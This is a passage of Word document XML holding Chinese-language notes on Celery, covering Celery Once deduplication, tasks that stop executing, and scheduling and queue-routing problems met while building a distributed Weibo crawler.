    <w:p w14:paraId="37820120" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　Celery Once 也是利用 Redis 加锁来实现, Celery Once 在 Task 类基础上实现了 QueueOnce 类，该类提供了任务去重的功能，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1171FDBF" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　所以在使用时，我们自己实现的方法需要将 QueueOnce 设置为 base   @task(base=QueueOnce, once={'graceful': True})   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D20490C" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　后面的 once 参数表示，在遇到重复方法时的处理方式，默认 graceful 为 False，那样 Celery 会抛出 AlreadyQueued 异常，手动设置为 True，则静默处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9F4832" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　　  另外如果要手动设置任务的 key，可以指定 keys 参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA18327" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    　　　@celery.task(base=QueueOnce, once={'keys': ['a']})   def slow_add(a, b):    sleep(30)    return a + b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E31329A" w14:textId="1B82FA18" w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D" w:rsidRDefault="00082DE9"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156</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">celery </w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>任务突然不执行是为什么</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506F2A11" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D60F18">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">　　</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>问题：   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53ADAC23" w14:textId="5798821B" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　别人推送很多消息给我，用 tornado 接收然后传到 celery 里面处理   celery 进程刚启动还是没问题，运行一天半天 突然里面的任务都不处理了</w:t>
      </w:r>
      <w:r w:rsidR="00DA0E72" w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>重新启动下 就能把之前接收到的推送 一个个继续处理。。。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B18C03" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　看不出是什么问题。。   打算修改下配置的处理任务的超时时间，看看能不能解决这个问题。  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E552C00" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　目前解决方案：   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0485DED6" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　在服务器加一个定时刷新，开启时间长，处理大量消息，出现任务超时，端口占用，任务没有放掉，导致后期任务无法执行，需要服务器定时任务重启  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC25B43" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　问题：   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2133D090" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　最近在写一个分布式微博爬虫，主要就是使用celery做的分布式任务调度。celery确实比较好用，但是也遇到一些问题，我遇到的问题主要集中在定时任务和任务路由这两个部分。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD4F921" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　本文不会讲解celery的基本使用，如果需要看celery入门教程的话，请点击这里跳转。   celery worker -A app_name -l info必须推荐在项目的根目录运行而且,这里的app_name必须是项目中的Celery实例的完整引用路径*。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14665882" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　如果不在项目根目录运行，那么相关的调用也得切换到app同级目录下，这一点可以通过命令行进行佐证      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355E2DD2" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　celery的定时任务会有一定时间的延迟。比如，我规定模拟登陆新浪微博任务每隔10个小时执行一次，那么定时任务第一次执行就会在开启定时任务之后的10个小时后才会执行。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7910ACC6" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　而我抓取微博需要马上执行，需要带上cookie，所以不能等那1个小时。这个没有一个比较好的解决方法，可以使用celery的crontab()来代替schdule做定时，它会在启动的时候就执行。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC11FD1" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　解决方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EEE6060" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　我采用的方法是第一次手动执行该任务，然后再通过schedule执行。      celery的定时任务可能会让任务重复。定时器一定只能在一个节点启动，否则会造成任务重复。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F43FB5" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">　　　　另外，如果当前worker节点都停止了，而beat在之后才停止，那么下一次启动worker的时候，它还会执行上一次未完成的任务，可能会有重复。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3CCDE8" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　由于抓取用户和抓取用户关注、粉丝的任务耗时和工作量不同，所以需要使用任务路由，将任务按比重合理分配到各个分布式节点上，这就需要使用到celery提供的task queue。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B41E3E" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　如果单独使用task queue还好，但是和定时任务一起使用，就可能出现问题。我遇到的问题就是定时任务压根就不执行！开始我的配置大概就是这样    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF8E5A6" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　app.conf.update(     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408EE2D4" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_TIMEZONE='Asia/Shanghai',     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A0AA78" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_ENABLE_UTC=True,     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B8940F" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_ACCEPT_CONTENT=['json'],     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E14F4D0" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_TASK_SERIALIZER='json',    　　</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6500C8F2" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_RESULT_SERIALIZER='json',     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A29CFA4" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERYBEAT_SCHEDULE={      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610FBDB6" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　 　　'user_task': {       'task': 'tasks.user.excute_user_task',       'schedule': timedelta(minutes=3),      },     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33EDE7FA" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　　　 'login_task': {       'task': 'tasks.login.excute_login_task',       'schedule': timedelta(hours=10),      },    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E93B22" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　　　 },     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368E74F9" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　CELERY_QUEUES=(     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122A4455" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　　　 Queue('login_queue', exchange=Exchange('login', type='direct'), routing_key='for_login'),     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8C3C7A" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　　　 Queue('user_crawler', exchange=Exchange('user_info', type='direct'), routing_key='for_user_info'),      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F91F16" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　　　 Queue('fans_followers', exchange=Exchange('fans_followers', type='direct'), routing_key='for_fans_followers')     )    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202A781E" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　结果过了一天发现定时任务并没有执行，后来把task加上了一个option字段，指定了任务队列，就可以了，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184EEABF" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　比如     'user_task': {      'task': 'tasks.user.excute_user_task',      'schedule': timedelta(minutes=3),      'options': {'queue': 'fans_followers', 'routing_key': 'for_fans_follwers'}     },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26905EAE" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　　  部分分布式节点一直出现Received task，但是却不执行其中的任务的情况。这种情况下重启worker节点一般就可以恢复。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8D0305" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　但是最好查查原因。通过查看flower的失败任务信息，才发现是插入数据的时候有的异常未被处理。这一点严格说来并不是celery的bug，不过也很令人费解。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E5C9FB" w14:textId="7B98C4F7" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　所以推荐在使用celery的时候配合使用flower做监控。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087699F6" w14:textId="41F87751" w:rsidR="00082DE9" w:rsidRPr="00CF0D9D" w:rsidRDefault="00082DE9" w:rsidP="00CF0D9D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>157</w:t>
      </w:r>
